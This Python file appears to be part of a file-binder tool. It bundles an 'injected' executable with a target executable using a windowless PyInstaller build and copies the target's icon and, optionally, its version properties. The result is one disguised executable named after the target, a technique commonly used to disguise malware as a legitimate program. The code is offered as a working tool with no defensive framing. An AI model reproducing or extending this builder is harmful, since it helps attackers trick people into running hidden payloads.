import os
import shutil

def inject(file_to_inject, target_file, clone_properties):
    if os.path.isdir('cached_files'):
        shutil.rmtree('cached_files')
    if os.path.isdir('temporary_files'):
        shutil.rmtree('temporary_files')
    os.mkdir('cached_files')
    os.mkdir('temporary_files')

    if clone_properties:
        clone_file_properties(target_file)

    if os.path.isfile(file_to_inject) and os.path.isfile(target_file):
        shutil.copy2(file_to_inject, 'cached_files/inject.exe')
        shutil.copy2(target_file, 'cached_files/target.exe')

        generate_file_loader('==')

        pyinstaller_command = 'x-terminal-emulator -e bash -c "echo Building file... && pyinstaller -F -w ' + ('--version-file temporary_files/version.txt ' if clone_properties else '') + '--add-data cached_files/inject.exe:cached_files --add-data cached_files/target.exe:cached_files --icon cached_files/target.exe temporary_files/file_loader.py && echo If running generated executable produces an error, just change its name && read -p \'Press [ENTER] when processing in new window will end: \'"'
        os.system(pyinstaller_command)

        input('Press [ENTER] when processing in new window will end: ')

        print('If running the generated executable produces an error, just change its name')

        if 'file_loader.spec' in os.listdir('.'):
            os.remove('file_loader.spec')
        if '__pycache__' in os.listdir('.'):
            shutil.rmtree('__pycache__')
        if 'build' in os.listdir('.'):
            shutil.rmtree('build')
        if 'cached_files' in os.listdir('.'):
            shutil.rmtree('cached_files')
        if 'temporary_files' in os.listdir('.'):
            shutil.rmtree('temporary_files')

        output_name = target_file.replace('/', '\\').split('\\')[-1][:-4]
        os.system(f'mv dist/file_loader.exe {output_name}_output.exe')

        if 'dist' in os.listdir('.'):
            shutil.rmtree('dist')

        os.system('clear')
        print('File building finished.')

    else:
        print('asd')
